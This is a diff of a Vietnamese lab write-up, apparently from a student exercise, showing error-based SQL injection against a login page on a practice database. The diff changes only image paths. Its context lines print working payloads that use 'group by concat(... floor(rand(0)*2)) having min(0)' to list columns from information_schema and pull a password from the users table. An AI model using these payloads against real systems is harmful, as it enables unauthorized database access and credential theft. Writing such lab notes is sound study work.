@@ -11,11 +11,11 @@ $cleaned_password = mysqli_real_escape_string($conn, $password);
 Khi em vào giao diện sẽ như thế này
 
 
-![Alt text](image-1.png)
+![Alt text](./imagesBooleanBase/image.png)
 
 - Đây là đoạn code dính lỗi sqli:
 
-![Alt text](image-2.png)
+![Alt text](./imagesErrorBase/image-1.png)
 
 - Em thử dùng lỗi error base để kiểm tra: em sử dụng payload :"' or 1=1 group by concat(database(),'-', floor(rand(0)*2)) having min(0)-- -" trong cheat seet sqli
 
@@ -24,12 +24,12 @@ Khi em vào giao diện sẽ như thế này
 - having min(0): Điều kiện HAVING luôn đúng, vì giá trị nhỏ nhất trong trường min(0) là 0.
 
 + Em nhận được kết quả
-![Alt text](image-3.png)
+![Alt text](./imagesErrorBase/image-2.png)
 
 - Em có thể thấy được là kết quả trả ra lỗi của database task2_kcsc bảng users và có 1 cột là id
 - Em tiếp tục tìm các cột khác trong bảng users
 Payload : ' or 1=1 group by concat((select column_name from information_schema.columns where table_name='users' limit 2,1),'-',floor(rand(0)*2)) having min(0)-- -
-![Alt text](image-4.png)
+![Alt text](./imagesErrorBase/image-3.png)
 - sau đó em dùng : ' or 1=1 group by concat((select password from users limit 2,1),'-',floor(rand(0)*2)) having min(0)-- -
 -> Em nhận được mật khẩu là hihi123
 
